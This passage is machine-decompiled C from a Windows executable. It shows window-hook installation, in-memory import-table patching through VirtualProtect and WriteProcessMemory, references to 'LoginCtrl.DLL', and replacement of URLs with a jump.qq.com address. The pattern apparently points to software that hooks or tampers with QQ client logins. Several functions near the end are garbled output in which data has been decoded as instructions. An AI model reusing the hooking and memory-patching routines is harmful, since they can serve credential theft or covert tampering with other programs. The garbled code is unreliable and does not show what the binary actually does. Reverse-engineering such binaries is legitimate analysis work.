    int32_t v2 = GetWindowLongA((int32_t *)-12, nIndex); // 0x407284
    int32_t v3; // bp-32, 0x407252
    int32_t * v4 = &v3; // 0x40728e
    if (v2 != 180) {
        int32_t v5 = GetWindowLongA((int32_t *)-16, nIndex); // 0x407293
        int32_t v6; // bp-40, 0x407252
        v4 = &v6;
        if ((v5 & 32) == 0) {
            // 0x40729c
            SendMessageA(NULL, 0, 210, nIndex);
            int32_t v7; // bp-56, 0x407252
            v4 = &v7;
        }
    }
    // 0x4072b5
    __writefsdword(0, *v4);
    *(int32_t *)((int32_t)v4 + 8) = 0x4072d8;
    return function_403372();
}

// Address range: 0x4072d1 - 0x4072d6
int32_t function_4072d1(void) {
    // 0x4072d1
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x4072d6 - 0x4072d8
int32_t function_4072d6(void) {
    // 0x4072d6
    int32_t result; // 0x4072d6
    return result;
}

// Address range: 0x4072d8 - 0x4072de
int32_t function_4072d8(int32_t a1, int32_t a2, int32_t a3) {
    // 0x4072d8
    int32_t result; // 0x4072d8
    return result;
}

// Address range: 0x4072ee - 0x407348
int32_t function_4072ee(void) {
    // 0x4072ee
    int32_t hWnd; // 0x4072ee
    int32_t * h = GetDC((int32_t *)hWnd); // 0x4072f6
    int32_t lParam; // 0x4072ee
    SelectObject((int32_t *)SendMessageA(NULL, 0, 49, lParam), h);
    int32_t hdc; // bp-40, 0x4072ee
    GetCharWidthA(&hdc, 42, 42, h);
    SelectObject(GetStockObject(10), h);
    ReleaseDC(h, (int32_t *)lParam);
    int32_t lpPoint; // bp-84, 0x4072ee
    GetCaretPos((struct tagPOINT *)&lpPoint);
    int32_t v1 = &lpPoint; // 0x40733a
    return (0x100000000 * (int64_t)(v1 >> 31) | (int64_t)v1) / (int64_t)(int32_t)h;
}

// Address range: 0x40734a - 0x407457
int32_t function_40734a(void) {
    int32_t v1 = __readfsdword(0); // bp-28, 0x40735e
    int32_t v2 = &v1; // 0x40735e
    __writefsdword(0, v2);
    if (g38 != 0) {
        // 0x407373
        *(int32_t *)g38 = 0;
    }
    // 0x407386
    int32_t v3; // 0x40734a
    int32_t v4; // 0x40734a
    if (g35 == 0) {
        // 0x40739a
        function_40747e();
        v4 = v2;
        goto lab_0x407441;
    } else {
        // 0x407390
        if (g36 != 0) {
            // 0x4073a4
            v3 = g36;
            if (*(char *)&g39 == 0) {
                goto lab_0x4073cd;
            } else {
                // 0x4073ae
                if (function_406c66() == 0) {
                    // 0x4073ae
                    v3 = g36;
                    goto lab_0x4073cd;
                } else {
                    // 0x4073c6
                    function_40747e();
                    v4 = v2;
                    goto lab_0x407441;
                }
            }
        } else {
            // 0x40739a
            function_40747e();
            v4 = v2;
            goto lab_0x407441;
        }
    }
  lab_0x407441:
    // 0x407441
    __writefsdword(0, *(int32_t *)v4);
    *(int32_t *)(v4 + 8) = 0x40745e;
    return function_403372();
  lab_0x4073cd:
    // 0x4073cd
    function_40358a(v3);
    function_4033c6();
    int32_t lpThreadAttributes; // bp-12, 0x40734a
    CreateThread((struct _SECURITY_ATTRIBUTES *)&lpThreadAttributes, 0, (int32_t (*)(int32_t *))2, (int32_t *)0x40634a, 0, NULL);
    CreateThread((struct _SECURITY_ATTRIBUTES *)&lpThreadAttributes, 0, (int32_t (*)(int32_t *))1, (int32_t *)0x40634a, 0, NULL);
    int32_t v5 = 0; // bp-112, 0x407435
    CreateThread((struct _SECURITY_ATTRIBUTES *)&lpThreadAttributes, 0, NULL, (int32_t *)0x40634a, 0, NULL);
    function_40747e();
    v4 = &v5;
    goto lab_0x407441;
}

// Address range: 0x407457 - 0x40745c
int32_t function_407457(void) {
    // 0x407457
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x40745c - 0x40745e
int32_t function_40745c(void) {
    // 0x40745c
    int32_t result; // 0x40745c
    return result;
}

// Address range: 0x40745e - 0x407465
int32_t function_40745e(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x40745e
    int32_t result; // 0x40745e
    return result;
}

// Address range: 0x40747e - 0x407493
int32_t function_40747e(void) {
    // 0x40747e
    function_403372();
    return function_403372();
}

// Address range: 0x407496 - 0x4074ff
int32_t function_407496(void) {
    int32_t v1 = 257; // bp-488, 0x4074a7
    int32_t v2; // 0x407496
    int32_t v3; // 0x407496
    WSAStartup((int16_t)v3, (struct WSAData *)v2);
    function_403372();
    int32_t namelen = &v1; // 0x4074be
    int32_t name = namelen; // bp-496, 0x4074be
    gethostname((char *)64, namelen);
    char * v4 = (char *)&name; // bp-500, 0x4074c4
    struct hostent * v5 = gethostbyname((char *)&name); // 0x4074c5
    int32_t result = (int32_t)v5; // 0x4074c5
    if (v5 == NULL) {
        // 0x4074f4
        return result;
    }
    int32_t v6 = *(int32_t *)(result + 12); // 0x4074ce
    int32_t v7 = *(int32_t *)v6; // 0x4074e8
    if (v7 != 0) {
        int32_t v8 = 0; // 0x4074e7
        int32_t v9 = (int32_t)&v4;
        int32_t v10 = v9; // 0x4074d7
        if (v8 == 0) {
            // 0x4074d9
            v10 = v9 - 4;
            *(int32_t *)v10 = *(int32_t *)v7;
            inet_ntoa((struct {int32_t e0;}){.e0 = (int32_t)&g118});
            function_406fe6();
        }
        // 0x4074e7
        v8++;
        int32_t v11 = *(int32_t *)(4 * v8 + v6); // 0x4074e8
        while (v11 != 0) {
            // 0x4074d5
            v9 = v10;
            v10 = v9;
            if (v8 == 0) {
                // 0x4074d9
                v10 = v9 - 4;
                *(int32_t *)v10 = *(int32_t *)v11;
                inet_ntoa((struct {int32_t e0;}){.e0 = (int32_t)&g118});
                function_406fe6();
            }
            // 0x4074e7
            v8++;
            v11 = *(int32_t *)(4 * v8 + v6);
        }
    }
    // 0x4074f4
    return WSACleanup();
}

// Address range: 0x407502 - 0x407527
int32_t function_407502(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x40750d
    __writefsdword(0, (int32_t)&v1);
    g111++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x407527 - 0x40752c
int32_t function_407527(void) {
    // 0x407527
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x40752c - 0x40752e
int32_t function_40752c(void) {
    // 0x40752c
    int32_t result; // 0x40752c
    return result;
}

// Address range: 0x40752e - 0x407530
int32_t function_40752e(int32_t a1) {
    // 0x40752e
    int32_t result; // 0x40752e
    return result;
}

// Address range: 0x407532 - 0x40753a
int32_t function_407532(void) {
    // 0x407532
    g111--;
    int32_t result; // 0x407532
    return result;
}

// Address range: 0x40753a - 0x407558
int32_t function_40753a(int32_t nCode, int32_t wParam, int32_t lParam) {
    // 0x40753a
    int32_t hhk; // 0x40753a
    return CallNextHookEx((int32_t *)hhk, nCode, wParam, lParam);
}

// Address range: 0x40755a - 0x407583
int32_t JmpHookOn(void) {
    int32_t * v1 = SetWindowsHookExA(0, g82, (int32_t *)0x40753a, 3); // 0x40756a
    g113 = (int32_t)v1;
    return v1 != NULL;
}

// Address range: 0x407586 - 0x407592
int32_t JmpHookOff(void) {
    // 0x407586
    return UnhookWindowsHookEx((int32_t *)g113);
}

// Address range: 0x407592 - 0x4075b7
int32_t function_407592(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x40759d
    __writefsdword(0, (int32_t)&v1);
    g112++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x4075b7 - 0x4075bc
int32_t function_4075b7(void) {
    // 0x4075b7
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x4075bc - 0x4075be
int32_t function_4075bc(void) {
    // 0x4075bc
    int32_t result; // 0x4075bc
    return result;
}

// Address range: 0x4075be - 0x4075c0
int32_t function_4075be(int32_t a1) {
    // 0x4075be
    int32_t result; // 0x4075be
    return result;
}

// Address range: 0x4075c2 - 0x4075ca
int32_t function_4075c2(void) {
    // 0x4075c2
    g112--;
    int32_t result; // 0x4075c2
    return result;
}

// Address range: 0x4075ca - 0x4075d0
int32_t * function_4075ca(int32_t * Base, char MappedAsImage, int16_t DirectoryEntry, int32_t * Size) {
    // 0x4075ca
    return ImageDirectoryEntryToData(Base, MappedAsImage, DirectoryEntry, Size);
}

// Address range: 0x4075d2 - 0x4075f7
int32_t function_4075d2(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x4075dd
    __writefsdword(0, (int32_t)&v1);
    g114++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x4075f7 - 0x4075fc
int32_t function_4075f7(void) {
    // 0x4075f7
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x4075fc - 0x4075fe
int32_t function_4075fc(void) {
    // 0x4075fc
    int32_t result; // 0x4075fc
    return result;
}

// Address range: 0x4075fe - 0x407600
int32_t function_4075fe(int32_t a1) {
    // 0x4075fe
    int32_t result; // 0x4075fe
    return result;
}

// Address range: 0x407602 - 0x40760a
int32_t function_407602(void) {
    // 0x407602
    g114--;
    int32_t result; // 0x407602
    return result;
}

// Address range: 0x407637 - 0x40763d
int32_t function_407637(void) {
    // 0x407637
    int32_t v1; // 0x407637
    return v1 & -256;
}

// Address range: 0x40763d - 0x407645
int32_t function_40763d(int32_t a1) {
    // 0x40763d
    int32_t v1; // 0x40763d
    return v1 & -256;
}

// Address range: 0x407645 - 0x4076ee
int32_t function_407645(int32_t a1) {
    // 0x407645
    int32_t v1; // 0x407645
    char * v2 = (char *)(v1 - 0x45ffbfd6); // 0x407645
    uint32_t v3; // 0x407645
    *v2 = *v2 + (char)(v3 / 256);
    int32_t v4; // 0x407645
    *(int32_t *)v4 = 0;
    uint32_t v5 = v4 & -256; // 0x40764e
    int32_t * v6 = (int32_t *)v5; // 0x40764f
    uint32_t v7 = *v6; // 0x40764f
    int32_t v8 = v7 - v5; // 0x40764f
    *v6 = v8;
    int32_t v9; // 0x407645
    int16_t v10 = v9; // 0x407652
    __asm_out(v10, 0);
    int32_t v11; // 0x407645
    int32_t result2; // 0x407645
    int32_t * v12; // 0x407645
    int32_t v13; // bp-4, 0x407645
    int32_t v14; // bp-8, 0x407645
    int32_t v15; // 0x407645
    int32_t v16; // 0x407645
    if (v7 < v5 || v8 == 0) {
        int32_t v17 = v15 + 1; // 0x407695
        char * v18 = (char *)(v3 + 0x43890846); // 0x407699
        char v19 = *v18; // 0x407699
        unsigned char v20 = (char)v16; // 0x407699
        *v18 = v19 + v20;
        int32_t v21 = v3 + 2; // 0x4076a1
        char * v22 = (char *)((v5 | (int32_t)((v19 ^ -1) < v20) | 20) + 87); // 0x4076a2
        *v22 = (char)v9 + 1 + *v22;
        int32_t * moduleHandle = GetModuleHandleA((char *)&g118); // 0x4076a5
        v13 = (int32_t)moduleHandle;
        int32_t (*func)() = GetProcAddress(moduleHandle, (char *)&g118); // 0x4076ab
        *(int32_t *)(v3 + 26) = (int32_t)func;
        result2 = v21;
        v12 = &v13;
        v11 = v17;
        if (func != NULL) {
            int32_t v23 = *(int32_t *)(v3 + 22); // 0x4076b9
            v14 = v23;
            int32_t v24 = *(int32_t *)(v3 + 10); // 0x4076bd
            int32_t v25 = v24; // bp-12, 0x4076c0
            function_407736(v23, v24);
            result2 = v21;
            v12 = &v25;
            v11 = v17;
        }
    } else {
        char * v26 = (char *)v5; // 0x407655
        *v26 = *v26 + (char)v16;
        int32_t v27; // 0x407645
        v13 = &v27;
        __asm_outsd(v10, v1);
        __asm_outsd(v10, v1);
        int32_t v28 = 73 * *(int32_t *)(v16 + 80); // 0x40766b
        int32_t v29; // bp-24, 0x407645
        int32_t * v30 = &v29; // 0x40766b
        if ((char)v9 != 0) {
            // 0x40766d
            int32_t v31; // 0x407645
            v28 = function_402af2(v15, v16, v3, v1, v31);
            int32_t v32; // bp-40, 0x407645
            v30 = &v32;
        }
        int32_t * moduleHandle2 = GetModuleHandleA((char *)(v9 & 255)); // 0x407683
        int32_t result = (int32_t)moduleHandle2; // 0x407683
        *(int32_t *)(v28 + 8) = result;
        result2 = v28;
        v12 = (int32_t *)((int32_t)v30 - 4);
        v11 = &v14;
        if (moduleHandle2 != NULL) {
            // 0x407691
            *(int32_t *)(v28 + 12) = a1;
            return result;
        }
    }
    // 0x4076cd
    if (*(char *)(v11 - 1) != 0) {
        // 0x4076d5
        function_402b4a();
        __writefsdword(0, *v12);
    }
    // 0x4076e4
    return result2;
}

// Address range: 0x4076ee - 0x407736
int32_t function_4076ee(void) {
    int32_t v1 = function_402b5a(); // 0x4076f0
    int32_t * v2 = (int32_t *)(v1 + 8); // 0x4076f9
    int32_t v3 = v1; // 0x4076fd
    if (*v2 != 0) {
        int32_t * v4 = (int32_t *)(v1 + 24); // 0x4076ff
        v3 = v1;
        if (*v4 != 0) {
            int32_t moduleHandle = (int32_t)GetModuleHandleA((char *)*(int32_t *)(v1 + 4)); // 0x407709
            int32_t v5 = *v2; // 0x40770e
            v3 = moduleHandle;
            if (v5 == moduleHandle) {
                // 0x407713
                v3 = function_407736(*v4, v5);
            }
        }
    }
    int32_t result = v3; // 0x40772a
    int32_t v6; // 0x4076ee
    if ((char)v6 >= 1) {
        // 0x40772c
        result = function_402b42();
    }
    // 0x407733
    return result;
}

// Address range: 0x407736 - 0x4077ec
int32_t function_407736(int32_t a1, int32_t a2) {
    // 0x407736
    int32_t result; // 0x407736
    if (a1 == 0 || a1 <= -1) {
        // 0x4077e3
        return result;
    }
    int32_t v1 = a1; // bp-52, 0x407767
    int32_t v2; // 0x407736
    int32_t v3; // 0x407736
    int32_t v4; // 0x407736
    int32_t * v5 = ImageDirectoryEntryToData((int32_t *)v2, (char)v3, (int16_t)v4, &g118); // 0x407768
    int32_t result2 = (int32_t)v5; // 0x407768
    if (v5 == NULL) {
        // 0x4077e3
        return result2;
    }
    int32_t result3 = *(int32_t *)(result2 + 12); // 0x4077dc
    if (result3 == 0) {
        // 0x4077e3
        return result3;
    }
    // 0x407775
    int32_t v6; // bp-24, 0x407736
    int32_t v7 = &v6;
    int32_t v8 = result3; // 0x4077dc
    int32_t v9 = result2; // 0x407736
    int32_t v10 = &v1; // 0x407736
    while (true) {
        int32_t v11 = v10;
        int32_t v12 = v9;
        *(int32_t *)(v11 - 4) = 0x1000000 * v3 / 0x1000000;
        int32_t v13 = v11 - 8; // 0x40777e
        *(int32_t *)v13 = v8 + a1;
        int32_t v14 = lstrcmpiA((char *)&g118, (char *)&g118); // 0x40777f
        v10 = v13;
        if (v14 == 0) {
            int32_t v15 = *(int32_t *)(v12 + 16) + a1; // 0x40778b
            int32_t v16 = *(int32_t *)v15; // 0x4077d3
            int32_t v17 = v16; // 0x4077d7
            int32_t v18 = v15; // 0x4077d7
            v10 = v13;
            if (v16 != 0) {
                int32_t v19 = v18;
                while (v17 != 0x10000 * v4 / 0x10000) {
                    int32_t v20 = v19 + 4; // 0x4077d0
                    int32_t v21 = *(int32_t *)v20; // 0x4077d3
                    v17 = v21;
                    v18 = v20;
                    v10 = v13;
                    if (v21 == 0) {
                        goto lab_0x4077d9;
                    }
                    v19 = v18;
                }
                // 0x407795
                int32_t v22; // bp-20, 0x407736
                *(int32_t *)(v11 - 12) = (int32_t)&v22;
                *(int32_t *)(v11 - 16) = 128;
                *(int32_t *)(v11 - 20) = 4;
                *(int32_t *)(v11 - 24) = v19;
                VirtualProtect(&g118, (int32_t)&g118, (int32_t)&g118, &g118);
                *(int32_t *)(v11 - 28) = v7;
                *(int32_t *)(v11 - 32) = 4;
                int32_t v23; // 0x407736
                *(int32_t *)(v11 - 36) = (int32_t)&v23;
                *(int32_t *)(v11 - 40) = v19;
                *(int32_t *)(v11 - 44) = (int32_t)GetCurrentProcess();
                WriteProcessMemory(&g118, &g118, &g118, (int32_t)&g118, &g118);
                *(int32_t *)(v11 - 48) = v7;
                *(int32_t *)(v11 - 52) = v22;
                *(int32_t *)(v11 - 56) = 4;
                int32_t v24 = v11 - 60; // 0x4077c8
                *(int32_t *)v24 = v19;
                VirtualProtect(&g118, (int32_t)&g118, (int32_t)&g118, &g118);
                v10 = v24;
            }
        }
      lab_0x4077d9:
        // 0x4077d9
        v8 = *(int32_t *)(v12 + 32);
        v9 = v12 + 20;
        result = v8;
        if (v8 == 0) {
            // break -> 0x4077e3
            break;
        }
    }
    // 0x4077e3
    return result;
}

// Address range: 0x4077ee - 0x4077f2
int32_t function_4077ee(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x4077ee
    int32_t v1; // 0x4077ee
    return *(int32_t *)(v1 + 24);
}

// Address range: 0x4077f2 - 0x407817
int32_t function_4077f2(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x4077fd
    __writefsdword(0, (int32_t)&v1);
    g115++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x407817 - 0x40781c
int32_t function_407817(void) {
    // 0x407817
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x40781c - 0x40781e
int32_t function_40781c(void) {
    // 0x40781c
    int32_t result; // 0x40781c
    return result;
}

// Address range: 0x40781e - 0x407820
int32_t function_40781e(int32_t a1) {
    // 0x40781e
    int32_t result; // 0x40781e
    return result;
}

// Address range: 0x407822 - 0x40782a
int32_t function_407822(void) {
    // 0x407822
    g115--;
    int32_t result; // 0x407822
    return result;
}

// Address range: 0x40782a - 0x407876
int32_t function_40782a(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x40782a
    int32_t v1; // 0x40782a
    int32_t v2; // 0x40782a
    int32_t v3; // 0x40782a
    return function_4077ee(v2, v3, v1, a1, a2);
}

// Address range: 0x407876 - 0x4078a5
int32_t function_407876(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x407876
    int32_t v1; // 0x407876
    return function_4077ee(v1, a1, a2, a3 != 2975 ? a3 : 2974, a4);
}

// Address range: 0x4078a6 - 0x40793e
int32_t function_4078a6(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    int32_t v1 = __readfsdword(0); // bp-32, 0x4078bd
    __writefsdword(0, (int32_t)&v1);
    function_403476();
    int32_t v2 = function_40380e() < 1 ? a4 : (int32_t)"http://jump.qq.com/clienturl_156";
    function_403476();
    int32_t v3 = function_40380e() < 1 ? a3 : (int32_t)"http://jump.qq.com/clienturl_156";
    function_4077ee(a1, a2, v3, v2, a5);
    __writefsdword(0, a6);
    return function_403396();
}

// Address range: 0x40793e - 0x407943
int32_t function_40793e(void) {
    // 0x40793e
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x407943 - 0x407945
int32_t function_407943(void) {
    // 0x407943
    int32_t result; // 0x407943
    return result;
}

// Address range: 0x407945 - 0x40794f
int32_t function_407945(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x407945
    int32_t result; // 0x407945
    return result;
}

// Address range: 0x407955 - 0x407957
int32_t function_407955(void) {
    // 0x407955
    int32_t result; // 0x407955
    return result;
}

// Address range: 0x407957 - 0x407acc
int32_t function_407957(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10, int32_t a11, int32_t a12, int32_t a13, int32_t a14, int32_t a15) {
    int32_t v1 = a15;
    int32_t v2; // 0x407957
    *(char *)v2 = 2 * (char)v2;
    int32_t result; // 0x407957
    char * v3 = (char *)(result + 116); // 0x407959
    uint32_t v4; // 0x407957
    uint32_t v5 = v4 / 256; // 0x407959
    unsigned char v6 = (char)v5; // 0x407959
    char v7 = *v3 + v6; // 0x407959
    *v3 = v7;
    if (v7 == 0) {
        // 0x4079e6
        return result;
    }
    // 0x40795e
    int32_t v8; // 0x407957
    unsigned char v9 = *(char *)&v8; // 0x40795e
    unsigned char v10 = (char)result; // 0x407960
    bool v11 = v9 > v6 | v10 > 153;
    char v12; // 0x407957
    int32_t result2; // 0x407957
    if ((v6 & 15) - (v9 & 15) > 15 || (v10 & 14) > 9) {
        char v13 = (v11 ? -102 : -6) + v10; // 0x407960
        result2 = result & -256 | (int32_t)v13;
        v12 = v13;
    } else {
        char v14 = v11 ? v10 - 96 : v10; // 0x407960
        result2 = result & -256 | (int32_t)v14;
        v12 = v14;
    }
    uint32_t v15; // 0x407957
    int16_t v16 = v15; // 0x407963
    *(int32_t *)v8 = __asm_insd(v16);
    if (((v6 - v9 ^ v6) & (v9 ^ v6)) >= 0) {
        char * v17 = (char *)(v15 + 0x760aa101); // 0x4079da
        *v17 = *v17 + (char)(v15 / 256);
        return result2 + 2;
    }
    // 0x407994
    int32_t v18; // 0x407957
    __asm_outsb(v16, __readgsbyte(v18));
    if (v12 == 0) {
        int32_t v19 = result2;
        // 0x4079e6
        return (v19 + (v11 ? 130 : 129) & 255 | v19 & -256) + 1;
    }
    if (v11) {
        int32_t v20 = result2;
        return v20 + v5 & 255 | v20 & -256;
    }
    // 0x40799a
    v8 = 117;
    *(int32_t *)54 = *(int32_t *)54 ^ v18;
    char * v21 = (char *)(result2 + 18); // 0x4079a1
    char v22 = *v21 + v6; // 0x4079a1
    char v23 = llvm_ctpop_i8(v22); // 0x4079a1
    *v21 = v22;
    if ((v23 & 1) == 0) {
        // 0x4079e6
        return result2;
    }
    char * v24 = (char *)(result2 + 30); // 0x4079a6
    char v25 = *v24 + v6; // 0x4079a6
    char v26 = llvm_ctpop_i8(v25); // 0x4079a6
    *v24 = v25;
    if ((v26 & 1) != 0) {
        char * v27 = (char *)(result2 + 42); // 0x4079ab
        char v28 = *v27 + v6; // 0x4079ab
        *v27 = v28;
        if (v28 < 0) {
            // 0x4079f0
            return result2;
        }
        char * v29 = (char *)(v4 + (int32_t)"LoginCtrl.DLL"); // 0x4079b0
        uint32_t v30; // 0x407957
        *v29 = *v29 + (char)(v30 / 256);
        g31 = &g7;
        *(int32_t *)((int32_t)&v1 - 4) = (int32_t)"user32.dll";
        return &g7;
    }
    char * v31 = (char *)(result2 + 82); // 0x4079eb
    char v32 = *v31 + v6; // 0x4079eb
    char v33 = llvm_ctpop_i8(v32); // 0x4079eb
    *v31 = v32;
    if ((v33 & 1) != 0) {
        // 0x4079f0
        return result2;
    }
    if (v32 == 0) {
        int32_t v34 = __readfsdword(result2); // bp-8, 0x407aa9
        __writefsdword(result2, (int32_t)&v34);
        return result2;
    }
    // 0x407a35
    *(char *)v8 = __asm_insb(v16);
    char * v35 = (char *)result2; // 0x407a37
    *v35 = *v35 + (char)result2;
    return result2;
}

// Address range: 0x407ace - 0x407ad6
int32_t function_407ace(void) {
    // 0x407ace
    g116--;
    int32_t result; // 0x407ace
    return result;
}

// Address range: 0x407ad6 - 0x407ae0
int32_t function_407ad6(void) {
    // 0x407ad6
    int32_t result; // 0x407ad6
    return result;
}

// Address range: 0x407ae2 - 0x407b01
int32_t function_407ae2(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x407aed
    __writefsdword(0, (int32_t)&v1);
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x407b01 - 0x407b06
int32_t function_407b01(void) {
    // 0x407b01
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x407b06 - 0x407b08
int32_t function_407b06(void) {
    // 0x407b06
    int32_t result; // 0x407b06
    return result;
}

// Address range: 0x407b08 - 0x407b0a
int32_t function_407b08(int32_t a1) {
    // 0x407b08
    int32_t result; // 0x407b08
    return result;
}

// Address range: 0x407b0a - 0x407e93
int32_t function_407b0a(int32_t a1, int32_t a2, int32_t a3) {
    // 0x407b0a
    int32_t v1; // 0x407b0a
    *(char *)v1 = 2 * (char)v1;
    int32_t v2; // 0x407b0a
    char v3 = *(char *)&v2 + (char)v2; // 0x407b0d
    char v4 = llvm_ctpop_i8(v3); // 0x407b0d
    *(char *)v2 = v3;
    int32_t v5; // 0x407b0a
    int32_t v6; // 0x407b0a
    int32_t result; // 0x407b0a
    int32_t v7; // 0x407b0a
    int32_t v8; // 0x407b0a
    uint32_t v9; // 0x407b0a
    if ((v4 & 1) != 0) {
        // 0x407b0a
        v5 = result;
        v6 = v2;
    } else {
        // 0x407b11
        *(char *)v8 = *(char *)&v8 + (char)(v2 / 256);
        char v10 = result;
        *(char *)v8 = v10 + 1 + *(char *)&v8;
        int32_t v11; // 0x407b0a
        uint32_t v12 = v11 + 2; // 0x407b17
        char * v13 = (char *)(v8 + 0x4a004040); // 0x407b19
        *v13 = *v13 + (char)v12;
        char * v14 = (char *)(v8 + 67); // 0x407b21
        char v15 = v9 / 256; // 0x407b21
        *v14 = *v14 + v15;
        *(char *)v8 = *(char *)&v8 + (char)(v12 / 256);
        int32_t v16 = v11 + 3; // 0x407b27
        char * v17 = (char *)(v8 + 70); // 0x407b29
        *v17 = v10 + 6 + *v17;
        *(char *)v8 = *(char *)&v8 + (char)v2;
        int32_t v18 = v2;
        int32_t v19 = v18 + 256 * v9 & 0xff00 | v18 & -0xff01; // 0x407b31
        v8 += 2;
        char * v20 = (char *)(v19 + 70); // 0x407b35
        *v20 = *v20 + v15;
        char * v21 = (char *)(v19 + 71); // 0x407b39
        *v21 = v10 + 10 + *v21;
        char * v22 = (char *)v19; // 0x407b3d
        *v22 = *v22 + (char)v18;
        char v23 = v9; // 0x407b45
        *v21 = v23 + (char)(v16 / 256) + *v21;
        *v22 = *v22 + v23;
        int32_t v24 = v19 & -256 | v18 + v16 & 255; // 0x407b4d
        v2 = v24;
        v5 = result + 15;
        v6 = v24;
        v7 = v16;
    }
    int32_t v25 = v6;
    int32_t v26 = v7 + v25 & 255 | v25 & -256; // 0x407b51
    char * v27 = (char *)(v26 + 0x12004049); // 0x407b55
    *v27 = *v27 + (char)((v9 + 0xffff) / 256);
    int32_t v28 = v26 - 1; // 0x407b5b
    int32_t v29 = v28 + (v5 + 2) / 256; // 0x407b5d
    int32_t v30 = v29 & 255 | v28 & -256; // 0x407b5d
    uint32_t v31 = v9 - 2; // 0x407b5f
    char * v32 = (char *)(v30 + 74); // 0x407b61
    *v32 = *v32 + (char)v29;
    char * v33 = (char *)v30; // 0x407b65
    *v33 = *v33 + (char)((v5 + 4) / 256);
    char * v34 = (char *)(v30 + 0x5a004049); // 0x407b69
    char v35 = v31; // 0x407b69
    *v34 = *v34 + v35;
    int32_t v36 = v30 - 2; // 0x407b6f
    int32_t v37 = v5 + 6 + v36 & 255 | v36 & -256; // 0x407b71
    int32_t v38 = v37 - 1; // 0x407b73
    char * v39 = (char *)(v37 + 0x2004049); // 0x407b75
    *v39 = *v39 + (char)v38;
    int32_t v40 = 2 * v38 & 254 | v38 & -256; // 0x407b7d
    uint32_t v41 = v40 - 1; // 0x407b7f
    char * v42 = (char *)v41; // 0x407b81
    char v43 = v5;
    *v42 = v43 + 10 + *v42 + (char)(v41 / 256);
    char * v44 = (char *)(v40 - 0x75ffbfb2); // 0x407b89
    char v45 = (v7 + 0xffff) / 256; // 0x407b89
    *v44 = *v44 + v45;
    char * v46 = (char *)(v40 + 82); // 0x407b91
    *v46 = v45 + v35 + *v46;
    char * v47 = (char *)(v40 + 90); // 0x407b99
    uint32_t v48 = v31 / 256; // 0x407b99
    char v49 = v48; // 0x407b99
    *v47 = *v47 + v49;
    char * v50 = (char *)v8; // 0x407b9d
    *v50 = *v50 + (char)((v5 + 15) / 256);
    uint16_t v51; // 0x407b0a
    uint32_t v52 = v41 + 256 * (int32_t)v51;
    int32_t v53 = v52 & 0xff00 | v41 & -0xff01; // 0x407ba1
    v2 = v53;
    char * v54 = (char *)(v8 - 0x3dffbfa4); // 0x407ba5
    *v54 = *v54 + v49;
    char * v55 = (char *)(v53 - 0x3dffbfa3); // 0x407bad
    *v55 = v43 + 18 + *v55;
    char * v56 = (char *)(v53 - 0x1dffbfa1); // 0x407bb5
    *v56 = *v56 + (char)v41;
    char * v57 = (char *)(v53 - 0x21ffbfa0); // 0x407bbd
    char v58 = v52 / 256; // 0x407bbd
    *v57 = *v57 + v58;
    int32_t v59 = 0x68a20040; // bp-22, 0x407bc3
    char * v60 = (char *)(v8 + 0x6600406d); // 0x407bc9
    *v60 = *v60 + v58;
    *(int32_t *)a1 = __asm_insd((int16_t)v53);
    result = v5 + 22;
    char * v61 = (char *)v53; // 0x407bd1
    char v62 = *v61 + v58; // 0x407bd1
    *v61 = v62;
    if (v62 != 0) {
        // 0x407c15
        return result & -256 | (int32_t)*(char *)v8;
    }
    char * v63 = (char *)v2; // 0x407bd5
    char v64 = *v63 + (char)result; // 0x407bd5
    *v63 = v64;
    if (v64 != 0) {
        // 0x407c19
        return result & -256 | 137;
    }
    unsigned char v65 = (char)result + (char)v2; // 0x407bd9
    int32_t v66 = v2 & -256 | (int32_t)v65; // 0x407bd9
    v2 = v66;
    if (v65 != 0) {
        // 0x407c1d
        *(int32_t *)(a2 - 76) = result;
        *(int32_t *)(a2 - 64) = result;
        return result;
    }
    char * v67 = (char *)(v66 + 0x2004075); // 0x407bdd
    unsigned char v68 = *v67; // 0x407bdd
    unsigned char v69 = v68 + v65; // 0x407bdd
    *v67 = v69;
    if (v69 < v68 || v69 == 0) {
        // 0x407c25
        return result;
    }
    unsigned char v70 = 2 * (char)v2; // 0x407be5
    int32_t v71 = v2 & -256 | (int32_t)v70; // 0x407be5
    v2 = v71;
    if (v70 != 0) {
        int32_t v72 = result + 1; // 0x407c29
        return v72 + v48 & 255 | v72 & -256;
    }
    char * v73 = (char *)v71; // 0x407be9
    char v74 = *v73 + (char)(result / 256); // 0x407be9
    *v73 = v74;
    if (v74 < 0) {
        // 0x407c2d
        return result;
    }
    unsigned char v75 = (char)v2; // 0x407bed
    char v76 = v2 / 256; // 0x407bed
    unsigned char v77 = v76 + v75; // 0x407bed
    int32_t v78 = v2 & -256 | (int32_t)v77; // 0x407bed
    v2 = v78;
    if (v77 >= v75 && v77 != 0) {
        // 0x407c31
        return v8 + 1;
    }
